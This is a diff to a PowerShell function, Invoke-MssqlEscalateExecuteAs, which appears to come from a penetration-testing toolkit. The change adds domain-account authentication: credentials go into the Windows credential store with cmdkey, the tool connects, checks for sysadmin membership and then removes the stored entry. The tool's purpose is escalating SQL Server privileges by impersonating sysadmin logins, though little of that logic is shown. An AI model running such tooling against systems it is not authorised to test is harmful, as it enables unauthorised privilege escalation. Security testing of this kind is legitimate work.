@@ -97,30 +97,44 @@ function Invoke-MssqlEscalateExecuteAs
     # Create fun connection object
     $conn = New-Object System.Data.SqlClient.SqlConnection
     
-    # Set authentication type and create connection string    
-    if($SqlUser -and $SqlPass){   
-          
-        # SQL login
+    # Check for domain credentials
+    if($SqlUser){
+        $DomainUserCheck = $SqlUser.Contains("\")
+    }
+
+    # Set authentication type and create connection string
+    if($SqlUser -and $SqlPass -and !$DomainUserCheck){
+    
+        # SQL login / alternative domain credentials
+         Write-Output "[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser..."
         $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
         [string]$ConnectUser = $SqlUser
     }else{
-          
+
+        # Create credentials management entry if a domain user is used
+        if ($DomainUserCheck -and (Test-Path  ("C:\Windows\System32\cmdkey.exe"))){   
+     		
+            Write-Output "[*] Attempting to authenticate to $SqlServerInstance with domain account $SqlUser..."
+            $SqlServerInstanceCol = $SqlServerInstance -replace ',', ':'
+	        $CredManCmd = 'cmdkey /add:'+$SqlServerInstanceCol+' /user:'+$SqlUser+' /pass:'+$SqlPass 
+            Write-Verbose "Command: $CredManCmd"
+            $ExecManCmd = invoke-expression $CredManCmd
+        }else{
+
+            Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
+        }
+
         # Trusted connection
-        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"
+        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
         $UserDomain = [Environment]::UserDomainName
-        $Username =  [Environment]::UserName
+        $Username = [Environment]::UserName
         $ConnectUser = "$UserDomain\$Username"
-       
     }
 
 
     # -----------------------------------------------
     # Test database connection
     # -----------------------------------------------
-
-    # Status User
-    Write-Host "[*] Attempting to Connect to $SqlServerInstance as $ConnectUser..."
-    
     try{
         $conn.Open()
         Write-Host "[*] Connected." -foreground "green"
@@ -129,6 +143,13 @@ function Invoke-MssqlEscalateExecuteAs
         $ErrorMessage = $_.Exception.Message
         Write-Host "[*] Connection failed" -foreground "red"
         Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
+
+        # Clean up credentials manager entry
+        if ($DomainUserCheck){
+            $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
+            Write-Verbose "Command: $CredManDel"   
+            $ExecManDel = invoke-expression $CredManDel
+        }  
         Break
     }
 
@@ -141,7 +162,7 @@ function Invoke-MssqlEscalateExecuteAs
     $conn.Open()
 
     # Setup query
-    $Query = "select is_srvrolemember('sysadmin') as status"
+    $Query = "select is_srvrolemember('sysadmin') as sysstatus"
 
     # Execute query
     $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
@@ -152,12 +173,19 @@ function Invoke-MssqlEscalateExecuteAs
     $TableIsSysAdmin.Load($results)  
 
     # Check if current user is a sysadmin
-    $TableIsSysAdmin | Select-Object -First 1 status | foreach {
+    $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {
 
-        $Checksysadmin = $_.status
+        $Checksysadmin = $_.sysstatus
         if ($Checksysadmin -ne 0){
                 Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
                 Write-Host "[*] All Done."
+
+                # Clean up credentials manager entry
+                if ($DomainUserCheck){
+                    $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
+                    Write-Verbose "Command: $CredManDel"   
+                    $ExecManDel = invoke-expression $CredManDel
+                }  
                 Break             
         }
     }
@@ -325,5 +353,15 @@ function Invoke-MssqlEscalateExecuteAs
     }else{
          Write-Host "[*] Sorry, the $ConnectUser account can't impersonate any sysadmins." -foreground "red" 
          Write-Host "[*] All done." 
-    }    	
+    }  
+    
+    # -----------------------------------------------
+    # Clean up credentials manager entry
+    # -----------------------------------------------
+    if ($DomainUserCheck){
+        $DomainUserCheck
+        $CredManDel = 'cmdkey /delete:'+$SqlServerInstanceCol
+        Write-Verbose "Command: $CredManDel"   
+        $ExecManDel = invoke-expression $CredManDel
+    }  	
 }
